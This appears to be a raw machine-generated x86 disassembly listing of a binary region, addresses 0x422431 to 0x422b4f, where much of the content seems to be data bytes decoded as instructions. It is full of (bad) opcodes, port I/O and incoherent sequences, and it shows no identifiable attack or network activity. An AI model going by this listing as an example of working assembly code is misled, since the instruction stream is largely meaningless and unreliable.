  422431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422432:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	shl    DWORD PTR [edx],cl
  42243c:	shr    DWORD PTR [ecx+esi*8],1
  42243f:	or     al,0xf7
  422441:	push   cs
  422442:	pop    ss
  422443:	outs   dx,BYTE PTR ds:[esi]
  422444:	adc    eax,0x3a49168
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	fwait
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422454:	xor    eax,0x9ba48da4
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422462:	imul   DWORD PTR [esi+0x17]
  422465:	dec    esi
  422466:	adc    eax,0x37a49148
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	fwait
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	jae    0x422414
  422470:	popf   
  422471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422472:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	fwait
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422484:	test   DWORD PTR [esi+0x16],0x91a814ae
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	aaa    
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	fwait
  42248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	jae    0x422436
  422492:	popf   
  422493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422494:	pop    ss
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	xchg   ebp,eax
  422497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422498:	push   ecx
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224a1:	inc    edx
  4224a2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224a6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224ac:	xchg   ecx,eax
  4224ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ae:	aaa    
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	fwait
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	jae    0x422458
  4224b4:	popf   
  4224b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224be:	fwait
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224c7:	mov    esi,?
  4224c9:	mov    ss,WORD PTR [esi]
  4224cb:	out    dx,al
  4224cc:	adc    al,0xe8
  4224ce:	xchg   ecx,eax
  4224cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d0:	aaa    
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	fwait
  4224d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d4:	jae    0x42247a
  4224d6:	popf   
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	fwait
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224ea:	imul   dh
  4224ec:	push   ss
  4224ed:	into   
  4224ee:	adc    al,0xc8
  4224f0:	xchg   ecx,eax
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	cmp    eax,0x51a49ba4
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	popf   
  4224f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fa:	jnp    0x4224a0
  4224fc:	xchg   ebx,eax
  4224fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fe:	fwait
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	xchg   ecx,eax
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	shl    dl,cl
  422504:	shr    ah,1
  422506:	lock int3 
  422508:	test   dh,0x16
  42250b:	cs adc al,0x28
  42250e:	push   ss
  42250f:	push   cs
  422510:	adc    al,0x8
  422512:	xchg   ebx,eax
  422513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422514:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42251b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422524:	fwait
  422525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422526:	lea    esp,[edx+edx*8-0xfd32fde]
  42252d:	or     al,0xf6
  42252f:	push   cs
  422530:	push   ss
  422531:	outs   dx,BYTE PTR ds:[esi]
  422532:	adc    al,0x68
  422534:	xchg   ecx,eax
  422535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422536:	add    BYTE PTR [eax],al
  422538:	shl    BYTE PTR [ebx],0x42
  42253b:	add    ah,cl
  42253d:	and    eax,0x25d40042
  422542:	inc    edx
  422543:	add    BYTE PTR [edi+eiz*1+0x42],bl
  422547:	add    BYTE PTR [eax-0x27ffbddd],bh
  42254d:	and    eax,0x7c3a0042
  422552:	inc    edx
  422553:	add    BYTE PTR [edx-0x37ffbd82],dh
  422559:	es inc edx
  42255b:	add    BYTE PTR [edi+eiz*1+0x42],cl
  42255f:	add    BYTE PTR [ebp+eiz*1+0x25b80042],dh
  422566:	inc    edx
  422567:	add    BYTE PTR [eax+0x27],cl
  42256a:	inc    edx
  42256b:	add    BYTE PTR [esi+eiz*1],bl
  42256e:	inc    edx
  42256f:	add    BYTE PTR [edx-0x35],cl
  422572:	push   es
  422573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422574:	scas   al,BYTE PTR es:[edi]
  422575:	or     al,0x6
  422577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422578:	shl    BYTE PTR ds:0x26800042,1
  42257e:	inc    edx
  42257f:	add    BYTE PTR [esi+eiz*1+0x26a00042],dl
  422586:	inc    edx
  422587:	add    BYTE PTR [eax+0x8004226],dh
  42258d:	es inc edx
  42258f:	add    BYTE PTR [ebx+eiz*1+0x26280042],bh
  422596:	inc    edx
  422597:	add    BYTE PTR [eax],bl
  422599:	es inc edx
  42259b:	add    BYTE PTR [eax+0x27],ah
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+0x38a4069a],ch
  4225a5:	inc    ebx
  4225a6:	out    0xbd,eax
  4225a8:	cmp    BYTE PTR [esi],ah
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax+0x26],al
  4225ae:	inc    edx
  4225af:	add    ah,bl
  4225b1:	and    eax,0x87240042
  4225b6:	loopne 0x422575
  4225b8:	jbe    0x422635
  4225ba:	pop    ds
  4225bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225bc:	add    BYTE PTR [eax],al
  4225be:	inc    eax
  4225bf:	add    dl,ch
  4225c1:	rcl    dl,cl
  4225c3:	pop    ecx
  4225c4:	scas   eax,DWORD PTR es:[edi]
  4225c5:	jle    0x422609
  4225c7:	add    bl,bl
  4225c9:	outs   dx,DWORD PTR fs:[esi]
  4225cb:	arpl   WORD PTR [edi+0xf],si
  4225ce:	pop    ebx
  4225cf:	xor    DWORD PTR [esi-0x5],esi
  4225d2:	(bad)  
  4225d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d4:	mov    dl,0xc
  4225d6:	xchg   ebx,eax
  4225d7:	test   al,0xc4
  4225d9:	and    eax,0xdaaa0042
  4225de:	push   es
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	stos   BYTE PTR es:[edi],al
  4225e1:	fiadd  WORD PTR [esi]
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225e5:	fiadd  DWORD PTR [esi]
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	mov    ds:0xbea406da,al
  4225ed:	fiadd  DWORD PTR [esi]
  4225ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f0:	mov    edx,0xb6a406da
  4225f5:	fiadd  DWORD PTR [esi]
  4225f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f8:	mov    dl,0xda
  4225fa:	push   es
  4225fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225fc:	mov    ds,edx
  4225fe:	push   es
  4225ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422600:	mov    bl,dl
  422602:	push   es
  422603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422604:	out    dx,al
  422605:	fiadd  DWORD PTR [esi]
  422607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422608:	dec    DWORD PTR [ebx]
  42260a:	adc    edi,DWORD PTR [edx]
  42260c:	mov    ah,0x23
  42260e:	inc    edx
  42260f:	add    BYTE PTR [ebp+0x17004228],ah
  422615:	loop   0x4225a0
  422617:	js     0x4225c7
  422619:	call   0xa4d7:0xcb3aa406
  422620:	and    al,0x75
  422622:	add    BYTE PTR [eax],al
  422624:	mov    al,0x23
  422626:	inc    edx
  422627:	add    BYTE PTR [edx],ah
  422629:	inc    ebx
  42262a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422638:	hlt    
  422639:	clc    
  42263a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422640:	sub    eax,DWORD PTR [edi+0x1f]
  422643:	jle    0x422645
	...
  422669:	add    BYTE PTR [eax],al
  42266b:	add    BYTE PTR [edx],bh
  42266d:	jl     0x4226b1
	...
  42267b:	add    cl,bh
  42267d:	jmp    0xa48f26c3
  422682:	push   ecx
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	jg     0x42262a
  422686:	inc    edi
  422687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422688:	push   ecx
  422689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268a:	inc    ebx
  42268b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268c:	std    
  42268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422696:	push   ebx
  422697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422698:	dec    ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	std    
  42269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a4:	push   ecx
  4226a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a6:	jg     0x42264c
  4226a8:	std    
  4226a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226aa:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b2:	dec    ebx
  4226b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b4:	inc    ebx
  4226b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b6:	jne    0x42265c
  4226b8:	pop    ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	jnp    0x422660
  4226bc:	dec    ecx
  4226bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226be:	fwait
  4226bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226c8:	xor    eax,eax
  4226ca:	xor    esp,DWORD PTR [eax]
  4226cc:	xor    eax,DWORD PTR [eax]
  4226ce:	xor    esp,DWORD PTR [eax+0x33]
  4226d1:	inc    eax
  4226d2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226d8:	xor    al,al
  4226da:	xor    ah,BYTE PTR [eax]
  4226dc:	xor    al,BYTE PTR [eax]
  4226de:	xor    ah,BYTE PTR [eax+0x32]
  4226e1:	inc    eax
  4226e2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226e8:	xor    ecx,esp
  4226ea:	xor    ecx,esi
  4226ec:	xor    ecx,eax
  4226ee:	xor    ecx,edx
  4226f0:	xor    edx,esp
  4226f2:	xor    edx,esi
  4226f4:	xor    edx,eax
  4226f6:	xor    edx,edx
  4226f8:	xor    ebx,esp
  4226fa:	xor    ebx,esi
  4226fc:	xor    ebx,eax
  4226fe:	xor    ebx,edx
  422700:	xor    eax,esi
  422702:	push   ebx
  422703:	shl    BYTE PTR [ebx-0x40],0x93
  422707:	rcl    DWORD PTR [esi-0x56],0x15
  42270b:	into   
  42270c:	xchg   ebp,eax
  42270d:	dec    ecx
  42270e:	xor    ecx,esp
  422710:	sbb    eax,0x50abaae2
  422715:	push   0x1e
  422717:	cs je  0x42272e
  42271a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422720:	imul   edi,edx,0xffffffd5
  422723:	leave  
  422724:	daa    
  422725:	dec    eax
  422726:	out    dx,eax
  422727:	pushf  
  422728:	mov    dh,0xdf
  42272a:	dec    esi
  42272b:	xchg   ebp,eax
  42272c:	lock xor DWORD PTR [esi-0x6c],ebp
  422730:	inc    ebp
  422731:	or     eax,0xc1470876
  422736:	js     0x4226f3
  422738:	popa   
  422739:	pop    ecx
  42273a:	jecxz  0x4227a7
  42273c:	mov    BYTE PTR [edx-0x56],0x5
  422740:	cs enter 0xaa46,0x44
  422745:	aas    
  422746:	inc    ebp
  422747:	leave  
  422748:	test   BYTE PTR [ebx+0x819a593],0xd8
  42274f:	jl     0x422799
  422751:	mov    es,WORD PTR [edx+0x0]
  422754:	jb     0x4227b0
  422756:	pop    ss
  422757:	sub    edi,DWORD PTR [ebp+eiz*1+0x26200042]
  42275e:	inc    edx
  42275f:	add    BYTE PTR [esi-0x5],dh
  422762:	fbld   TBYTE PTR [ebp+0x0]
	...
  422770:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422776:	popa   
  422777:	arpl   WORD PTR [edi+0x7a],bp
  42277a:	popa   
  42277b:	outs   dx,DWORD PTR ds:[si]
  42277d:	gs ins DWORD PTR es:[edi],dx
  42277f:	jae    0x4227c3
  422781:	outs   dx,DWORD PTR ds:[esi]
  422782:	ins    BYTE PTR es:[edi],dx
  422783:	gs mov cl,0x65
  422786:	in     eax,dx
  422787:	jg     0x4227c2
  422789:	ja     0x4227f4
  42278b:	jp     0x422780
  42278d:	inc    esp
  42278e:	push   0x1b
  422790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422791:	push   ecx
  422792:	dec    esp
  422793:	gs jb  0x42280f
  422796:	popa   
  422797:	push   ebx
  422798:	jne    0x42280b
  42279a:	jae    0x4227fd
  42279c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227a3:	inc    esp
  4227a4:	(bad)  [edx+0x65]
  4227a7:	jae    0x4227ff
  4227a9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227b0:	jb     0x422814
  4227b2:	gs je  0x422788
  4227b5:	lds    edx,FWORD PTR [eax-0x68]
  4227b8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227bc:	fs jne 0x42282e
  4227bf:	push   eax
  4227c0:	gs fs jae 0x422831
  4227c4:	popa   
  4227c5:	ins    DWORD PTR es:[edi],dx
  4227c6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227d9:	add    BYTE PTR [eax],al
  4227db:	add    BYTE PTR [esp+ecx*4],ch
  4227de:	push   ss
  4227df:	mov    esi,0x6f4c8773
  4227e4:	jb     0x422854
  4227e6:	jno    0x422851
  4227e8:	or     al,0x36
  4227ea:	lods   al,BYTE PTR ds:[esi]
  4227eb:	repnz push edx
  4227ed:	je     0x42285e
  4227ef:	je     0x422835
  4227f1:	js     0x4227af
  4227f3:	cmc    
  4227f4:	outs   dx,DWORD PTR ds:[esi]
  4227f5:	ins    DWORD PTR es:[edi],dx
  4227f6:	popa   
  4227f7:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  4227fe:	popa   
  4227ff:	jb     0x422876
  422801:	push   0x68736f79
  422806:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42280d:	mov    ch,0xa5
  42280f:	jns    0x422884
  422811:	outs   dx,DWORD PTR ds:[esi]
  422812:	addr16 popa 
  422814:	add    BYTE PTR [bp+si],bh
  422817:	sub    bh,cl
  422819:	icebp  
  42281a:	gs ins BYTE PTR es:[edi],dx
  42281c:	jae    0x422866
  42281e:	popa   
  42281f:	je     0x422889
  422821:	ins    DWORD PTR es:[edi],dx
  422822:	add    BYTE PTR gs:[bx+si],al
  422826:	in     al,dx
  422827:	mov    ecx,0x414ad1d2
  42282c:	ins    DWORD PTR es:[edi],dx
  42282d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422834:	gs ins DWORD PTR es:[edi],dx
  422836:	add    BYTE PTR [eax],al
  422838:	jne    0x42284a
  42283a:	popa   
  42283b:	or     BYTE PTR [esi+0x73654dbb],al
  422841:	popa   
  422842:	push   0x78000061
  422847:	loope  0x42288b
  422849:	stos   BYTE PTR es:[edi],al
  42284a:	je     0x4228ad
  42284c:	push   edi
  42284d:	popa   
  42284e:	jb     0x4228bb
  422850:	jae    0x4228bd
  422852:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422859:	loope  0x422827
  42285b:	aad    0x6f
  42285d:	jb     0x4228cb
  42285f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422866:	je     0x42287b
  422868:	adc    al,BYTE PTR [ebp+0x77646172]
  42286e:	outs   dx,DWORD PTR ds:[esi]
  42286f:	gs ins DWORD PTR es:[edi],dx
  422871:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422878:	outs   dx,BYTE PTR ds:[esi]
  422879:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422880:	ja     0x4228e6
  422882:	outs   dx,DWORD PTR ds:[esi]
  422883:	popa   
  422884:	outs   dx,BYTE PTR ds:[esi]
  422885:	gs jae 0x4228ea
  422888:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42288f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422897:	inc    ebx
  422898:	jb     0x422853
  42289a:	sbb    al,0xd9
  42289c:	jo     0x422907
  42289e:	addr16 js 0x422916
  4228a1:	jo     0x422918
  4228a3:	fs add ch,cl
  4228a6:	xchg   esi,eax
  4228a7:	in     eax,dx
  4228a8:	jno    0x42291b
  4228aa:	iret   
  4228ab:	jbe    0x4228a6
  4228ad:	or     dh,BYTE PTR [esi-0x3]
  4228b0:	cwde   
  4228b1:	int    0xd6
  4228b3:	std    
  4228b4:	pop    ebp
  4228b5:	fsubr  DWORD PTR [edi]
  4228b7:	dec    edx
  4228b8:	xor    eax,0xd6cd860a
  4228bd:	stc    
  4228be:	inc    ebx
  4228bf:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228c5:	dec    edx
  4228c6:	sbb    BYTE PTR [ecx+0x52],bh
  4228c9:	mov    ch,al
  4228cb:	jns    0x42291f
  4228cd:	dec    edx
  4228ce:	sbb    BYTE PTR [ecx+0x6e],bh
  4228d1:	xchg   edx,eax
  4228d2:	cmp    eax,0xcd96c5cb
  4228d7:	in     eax,dx
  4228d8:	jno    0x42294b
  4228da:	iret   
  4228db:	jbe    0x4228d6
  4228dd:	or     dh,BYTE PTR [esi-0x3]
  4228e0:	int    0x96
  4228e2:	std    
  4228e3:	pop    ebp
  4228e4:	jns    0x422931
  4228e6:	pop    edx
  4228e7:	xor    eax,0x96cd920a
  4228ec:	stc    
  4228ed:	inc    ebx
  4228ee:	icebp  
  4228ef:	(bad)  
  4228f0:	das    
  4228f1:	int    0x76
  4228f3:	mov    BYTE PTR [ecx+0x6e],bh
  4228f6:	mov    DWORD PTR [edx-0x13749387],esi
  4228fc:	jns    0x42296c
  4228fe:	xchg   BYTE PTR [edi-0x3d789187],ah
  422904:	retf   
  422905:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42290c:	jno    0x4228dd
  42290e:	jbe    0x422909
  422910:	or     dh,BYTE PTR [esi-0x3]
  422913:	int    0x96
  422915:	std    
  422916:	pop    ebp
  422917:	fdiv   DWORD PTR [ebx-0x6df55465]
  42291d:	int    0x96
  42291f:	stc    
  422920:	inc    ebx
  422921:	icebp  
  422922:	(bad)  
  422923:	test   BYTE PTR [ecx+0x6e],bh
  422926:	mov    ebp,esp
  422928:	int    0x76
  42292a:	mov    BYTE PTR [ecx+0x6e],bh
  42292d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422934:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42293b:	jno    0x42290c
  42293d:	jbe    0x422938
  42293f:	or     dh,BYTE PTR [esi-0x3]
  422942:	cwde   
  422943:	int    0xd6
  422945:	std    
  422946:	pop    ebp
  422947:	ret    0x2be4
  42294a:	cmp    DWORD PTR [edx],ecx
  42294c:	xchg   ch,cl
  42294e:	(bad)  
  42294f:	stc    
  422950:	inc    ebx
  422951:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422957:	test   BYTE PTR [ebx-0x78913648],ch
  42295d:	ret    0x79ab
  422960:	xchg   edx,eax
  422961:	aad    0xcb
  422963:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422969:	iret   
  42296a:	jbe    0x422965
  42296c:	or     dh,BYTE PTR [esi-0x3]
  42296f:	int    0x96
  422971:	std    
  422972:	pop    ebp
  422973:	pop    ecx
  422974:	ins    BYTE PTR es:[edi],dx
  422975:	cmp    dh,BYTE PTR ds:0x96cd920a
  42297b:	stc    
  42297c:	inc    ebx
  42297d:	icebp  
  42297e:	(bad)  
  42297f:	push   ebx
  422980:	int    0x76
  422982:	mov    BYTE PTR [ecx+0x6e],bh
  422985:	mov    BYTE PTR [edi+0x47816c79],ah
  42298b:	jns    0x4229fb
  42298d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422993:	call   0xcded:0xcd965b98
  42299a:	jbe    0x4229d0
  42299c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229a3:	sbb    al,0x81
  4229a5:	(bad)  
  4229a6:	and    al,0x98
  4229a8:	int    0xd6
  4229aa:	adc    al,0x47
  4229ac:	mov    ds:0xff8eca62,al
  4229b1:	add    al,0x7d
  4229b3:	add    ch,dl
  4229b5:	lods   eax,DWORD PTR ds:[esi]
  4229b6:	clc    
  4229b7:	icebp  
  4229b8:	jo     0x422984
  4229ba:	(bad)  
  4229bc:	jge    0x4229be
  4229be:	aad    0xad
  4229c0:	clc    
  4229c1:	icebp  
  4229c2:	jo     0x422956
  4229c4:	adc    ecx,ebp
  4229c6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229cd:	jo     0x422a3f
  4229cf:	jo     0x422a41
  4229d1:	jo     0x42296d
  4229d3:	xor    esi,edi
  4229d5:	cwde   
  4229d6:	add    al,0xc
  4229d8:	add    BYTE PTR [ebp-0x80],bl
  4229db:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229e1:	or     DWORD PTR [eax-0x75],ebx
  4229e4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229eb:	jecxz  0x4229d8
  4229ed:	hlt    
  4229ee:	scas   eax,DWORD PTR es:[edi]
  4229ef:	rol    BYTE PTR [ebp-0x6def4262],0x80
  4229f6:	sub    dl,0xfa
  4229f9:	iret   
  4229fa:	pop    eax
  4229fb:	iret   
  4229fc:	push   0xffffffcd
  4229fe:	out    0xfd,al
  422a00:	int    0x76
  422a02:	adc    DWORD PTR [ebx],esi
  422a04:	out    0x34,al
  422a06:	sub    ecx,ecx
  422a08:	or     dh,BYTE PTR [esi-0x43]
  422a0b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a11:	sub    BYTE PTR [edi],0x6
  422a14:	sub    DWORD PTR [eax-0x72357f80],eax
  422a1a:	cmc    
  422a1b:	sub    esp,esi
  422a1d:	in     eax,dx
  422a1e:	aad    0xe9
  422a20:	add    ebx,ebp
  422a22:	mov    bh,dh
  422a24:	fcmovnbe st,st(5)
  422a26:	out    dx,eax
  422a27:	pushf  
  422a28:	xchg   edi,edi
  422a2a:	test   al,0xcf
  422a2c:	fs adc ebx,0xffffffe9
  422a30:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a34:	iret   
  422a35:	int3   
  422a36:	call   0x80c278ff
  422a3b:	jno    0x4229d5
  422a3d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a47:	int    0xe6
  422a49:	std    
  422a4a:	xor    esp,esi
  422a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a4d:	das    
  422a4e:	pop    ecx
  422a4f:	push   0xffffffcd
  422a51:	(bad)  
  422a52:	or     eax,0xfcde9e3
  422a57:	sub    edi,eax
  422a59:	xchg   DWORD PTR [edi],ecx
  422a5b:	iret   
  422a5c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a62:	add    BYTE PTR [eax-0x102c8233],0x88
  422a69:	add    al,0xf2
  422a6b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a72:	adc    dh,0x4e
  422a75:	inc    ebx
  422a76:	jns    0x4229fa
  422a78:	fldlg2 
  422a7a:	es int 0xc6
  422a7d:	or     eax,0x809221bd
  422a82:	add    al,0x81
  422a85:	mov    al,ds:0xfb87d287
  422a8a:	add    al,0xbd
  422a8c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422a93:	jns    0x422a62
  422a95:	ins    DWORD PTR es:[edi],dx
  422a96:	and    ch,0xa0
  422a99:	push   edx
  422a9a:	add    al,0x3
  422a9c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422aa2:	push   edx
  422aa3:	add    al,0x3
  422aa5:	push   ebx
  422aa6:	mov    al,cl
  422aa8:	test   bh,bh
  422aaa:	retf   
  422aab:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ab3:	(bad)  
  422ab4:	in     al,dx
  422ab5:	outs   dx,DWORD PTR ds:[esi]
  422ab6:	rcl    bl,1
  422ab8:	(bad)  
  422ab9:	jge    0x422a78
  422abb:	outs   dx,DWORD PTR ds:[esi]
  422abc:	xchg   edx,eax
  422abd:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422ac4:	sahf   
  422ac5:	mov    al,ds:0x3454009e
  422aca:	jno    0x422b2e
  422acc:	popa   
  422acd:	mov    ah,0x86
  422acf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ad6:	push   cs
  422ad7:	(bad)  
  422ad8:	jge    0x422a97
  422ada:	push   eax
  422adb:	xchg   edx,eax
  422adc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422ae3:	jge    0x422aa2
  422ae5:	push   ss
  422ae6:	xchg   edx,eax
  422ae7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422aee:	ror    BYTE PTR [ecx+0x53d09282],1
  422af4:	jo     0x422ac3
  422af6:	(bad)  
  422af7:	std    
  422af8:	xor    edx,esi
  422afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422afb:	inc    ebx
  422afc:	(bad)  
  422afd:	xor    al,0x2f
  422aff:	or     esp,ebx
  422b01:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b0b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b15:	int    0xd6
  422b17:	popf   
  422b18:	aam    0x23
  422b1a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b20:	or     ch,0xd6
  422b23:	xchg   ebp,eax
  422b24:	aam    0x89
  422b26:	int    0xd6
  422b28:	icebp  
  422b29:	int    0x8d
  422b2b:	xchg   ebp,eax
  422b2c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b32:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b38:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b3e:	pushf  
  422b3f:	stos   BYTE PTR es:[edi],al
  422b40:	sahf   
  422b41:	popa   
  422b42:	mov    esp,0xc180804a
  422b47:	mov    BYTE PTR [edi+0x649a62d9],al
  422b4d:	mov    ecx,edx
  422b4f:	rol    DWORD PTR [edx+0x70878492],cl
